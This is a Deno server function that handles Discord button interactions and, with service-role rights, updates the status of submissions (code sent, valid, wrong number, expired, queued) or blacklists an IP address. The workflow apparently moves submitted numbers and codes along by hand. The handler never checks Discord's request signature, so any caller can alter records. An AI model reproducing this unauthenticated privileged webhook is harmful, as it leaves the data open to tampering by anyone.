import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

Deno.serve(async (req) => {
  try {
    const rawBody = await req.text();
    const interaction = JSON.parse(rawBody);

    // Discord PING — always respond immediately
    if (interaction.type === 1) {
      return Response.json({ type: 1 });
    }

    // Button click (type 3 = MESSAGE_COMPONENT)
    if (interaction.type === 3) {
      const customId = interaction.data?.custom_id || "";
      const parts = customId.split(":");
      const actionType = parts[1];
      const submissionId = parts[2];
      const ipAddr = parts[3] || null;

      const base44 = createClientFromRequest(req);

      const statusMap = {
        code_ready: "code_ready",
        valid: "code_valid",
        wrong: "code_wrong",
        expired: "code_expired",
        wait: "waiting_queue",
      };

      if (actionType === "blacklist" && ipAddr) {
        await base44.asServiceRole.entities.BlacklistEntry.create({ value: ipAddr, type: "ip" });
        await base44.asServiceRole.entities.Submission.update(submissionId, { status: "code_wrong" });
      } else if (statusMap[actionType]) {
        await base44.asServiceRole.entities.Submission.update(submissionId, { status: statusMap[actionType] });
      }

      const actionLabels = {
        code_ready: "Code envoyé ✅",
        valid: "Code validé ✅",
        wrong: "Mauvais numéro ❌",
        expired: "Renvoyé au code ⏰",
        wait: "Mis en attente ⏳",
        blacklist: "IP blacklistée 🚫",
      };

      return Response.json({
        type: 4,
        data: {
          content: `✅ **Opération réussie** — ${actionLabels[actionType] || "Action effectuée"}`,
          flags: 64,
        }
      });
    }

    return Response.json({ type: 1 });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});